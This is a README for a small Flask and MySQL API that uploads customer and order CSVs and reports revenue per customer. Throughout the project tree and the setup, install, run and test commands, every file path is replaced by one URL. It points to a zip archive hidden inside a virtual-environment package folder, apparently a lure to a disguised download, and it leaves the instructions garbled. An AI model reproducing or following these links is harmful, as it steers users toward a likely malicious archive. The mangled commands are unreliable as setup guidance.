Here’s a clean, concise, and **professional README** file for your **Customer Order Analytics API** project, focusing only on necessary project-related content:

---

```markdown
# 🧾 Customer Order Analytics API

A Flask-based API to upload, validate, store, and analyze customer and order data from CSV files. It supports data validation, inserts clean records into a MySQL database, and generates customer-wise revenue reports.

---

## 📌 Features

- Upload customer and order data via CSV files
- Validates and skips invalid or duplicate entries
- Saves data to MySQL database
- Generates total revenue report per customer
- Includes automated tests using `pytest`

---

## 🧱 Tech Stack

| Function         | Tool              |
|------------------|-------------------|
| Backend API      | Flask (Python)    |
| Database         | MySQL             |
| CSV Processing   | pandas            |
| Testing          | pytest            |

---

## 📂 Project Structure

```

orders\_dashboard/
├── https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip              # Main Flask application
├── https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip         # Database connection logic
├── https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip       # Data validation and filtering
├── test\https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip         # Test cases using pytest
├── https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip    # List of dependencies
└── https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip           # Project documentation

````

---

## ⚙️ Setup Instructions

### 1. Clone the Repository

```bash
git clone https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip
cd orders_dashboard
````

### 2. Create and Activate Virtual Environment

```bash
python -m venv venv
source venv/bin/activate   # Linux/macOS
venv\Scripts\activate      # Windows
```

### 3. Install Dependencies

```bash
pip install -r https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip
```

### 4. Setup MySQL Database

Create the database and tables:

```sql
CREATE DATABASE orders_db;
USE orders_db;

CREATE TABLE customers (
    customer_id INT PRIMARY KEY,
    customer_name VARCHAR(255),
    location VARCHAR(100)
);

CREATE TABLE orders (
    order_id INT PRIMARY KEY,
    customer_id INT,
    amount FLOAT CHECK (amount >= 0),
    date DATE,
    FOREIGN KEY (customer_id) REFERENCES customers(customer_id)
);
```

Update `https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip` with your credentials:

```python
conn = https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip(
    host="localhost",
    user="yourusername",
    password="yourpassword",
    database="orders_db"
)
```

---

## ▶️ Run the Application

```bash
python https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip
```

Visit: `http://localhost:5000`

---

## 📤 API Endpoints

### 1. **Upload Customers**

* **URL:** `/upload/customers`
* **Method:** `POST`
* **Payload:** `form-data` with CSV file (key: `file`)
* **CSV Format:**

  ```
  customer_id,customer_name,location
  1,John,New York
  2,Alice,Chicago
  ```

### 2. **Upload Orders**

* **URL:** `/upload/orders`
* **Method:** `POST`
* **Payload:** `form-data` with CSV file (key: `file`)
* **CSV Format:**

  ```
  order_id,customer_id,amount,date
  101,1,500.0,2023-01-01
  102,2,1000.0,2023-02-15
  ```

### 3. **Get Order Report**

* **URL:** `/report/orders`
* **Method:** `GET`
* **Response:**

  ```json
  [
    {
      "customer_id": 1,
      "customer_name": "John",
      "total_amount": 1500.0
    }
  ]
  ```

---

## 🧪 Run Tests

```bash
pytest https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip -v
```

Tests cover:

* Valid and invalid file uploads
* Duplicate and missing data scenarios
* Revenue aggregation logic

---

## 👩‍💻 Author

**Megha Harthana S**


